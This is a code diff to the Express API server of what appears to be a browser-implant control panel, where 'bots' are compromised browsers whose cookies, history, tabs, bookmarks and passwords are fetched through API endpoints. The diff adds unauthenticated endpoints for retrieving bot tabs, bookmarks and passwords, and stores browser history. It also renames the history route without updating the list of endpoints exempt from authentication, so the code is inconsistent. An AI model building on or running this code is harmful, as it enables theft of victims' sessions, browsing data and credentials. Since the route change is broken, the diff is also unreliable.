@@ -27,7 +27,7 @@ function getMethods(obj) {
     var result = [];
     for (var id in obj) {
         try {
-            if (typeof(obj[id]) == "function") {
+            if (typeof (obj[id]) == "function") {
                 result.push(id + ": " + obj[id].toString());
             }
         } catch (err) {
@@ -59,7 +59,7 @@ async function get_api_server(proxy_utils) {
     /*
         Add default security headers
     */
-    app.use(async function(req, res, next) {
+    app.use(async function (req, res, next) {
         set_secure_headers(req, res);
         next();
     });
@@ -82,19 +82,22 @@ async function get_api_server(proxy_utils) {
     app.use('/', express.static(
         '/work/gui/dist/',
         {
-          setHeaders: function (res, path, stat) {
-            res.set("Content-Security-Policy", "default-src 'none'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self'; font-src 'none'; connect-src 'self'");
-          }
+            setHeaders: function (res, path, stat) {
+                res.set("Content-Security-Policy", "default-src 'none'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'none'; connect-src 'self'");
+            }
         }
     ));
 
-    app.use(async function(req, res, next) {
+    app.use(async function (req, res, next) {
         const ENDPOINTS_NOT_REQUIRING_AUTH = [
             '/health',
             `${API_BASE_PATH}/login`,
             `${API_BASE_PATH}/verify-proxy-credentials`,
             `${API_BASE_PATH}/get-bot-browser-cookies`,
             `${API_BASE_PATH}/get-bot-browser-history`,
+            `${API_BASE_PATH}/get-bot-browser-tabs`,
+            `${API_BASE_PATH}/get-bot-browser-bookmarks`,
+            `${API_BASE_PATH}/get-bot-browser-password`,
         ];
         if (ENDPOINTS_NOT_REQUIRING_AUTH.includes(req.originalUrl)) {
             next();
@@ -207,6 +210,7 @@ async function get_api_server(proxy_utils) {
                 'createdAt',
                 'current_tab',
                 'current_tab_image',
+                'history',
                 'tabs',
                 'bookmarks',
             ]
@@ -243,7 +247,7 @@ async function get_api_server(proxy_utils) {
             }
         });
 
-        if(!user) {
+        if (!user) {
             res.status(200).json({
                 "success": false,
                 "error": "User not found with those credentials, please try again.",
@@ -423,6 +427,10 @@ async function get_api_server(proxy_utils) {
                 type: 'string',
                 required: true
             },
+            method: {
+                type: 'array',
+                required: false
+            }
         }
     }
     app.post(API_BASE_PATH + '/get-bot-browser-cookies', validate({ body: GetBotBrowserDataSchema }), async (req, res) => {
@@ -454,7 +462,7 @@ async function get_api_server(proxy_utils) {
         }).end();
     });
 
-    app.post(API_BASE_PATH + '/get-bot-browser-history', validate({ body: GetBotBrowserDataSchema }), async (req, res) => {
+    app.post(API_BASE_PATH + '/get-bot-browser', validate({ body: GetBotBrowserDataSchema }), async (req, res) => {
         const bot_data = await Bots.findOne({
             where: {
                 proxy_username: req.body.username,
@@ -478,7 +486,7 @@ async function get_api_server(proxy_utils) {
         res.status(200).json({
             "success": true,
             "result": {
-                "cookies": browser_history
+                "history": browser_history
             }
         }).end();
     });
@@ -486,7 +494,7 @@ async function get_api_server(proxy_utils) {
     /*
      * Handle JSON Schema errors
      */
-    app.use(function(err, req, res, next) {
+    app.use(function (err, req, res, next) {
         var responseData;
 
         if (err.name === 'JsonSchemaValidation') {
@@ -520,7 +528,7 @@ function set_secure_headers(req, res) {
     res.set("X-Frame-Options", "deny");
 
     if (req.path.startsWith(API_BASE_PATH)) {
-        res.set("Content-Security-Policy", "default-src 'none'; script-src 'none'");
+        res.set("Content-Security-Policy", "default-src 'none'; script-src 'none'; img-src 'self' data:;");
         res.set("Content-Type", "application/json");
         return
     }
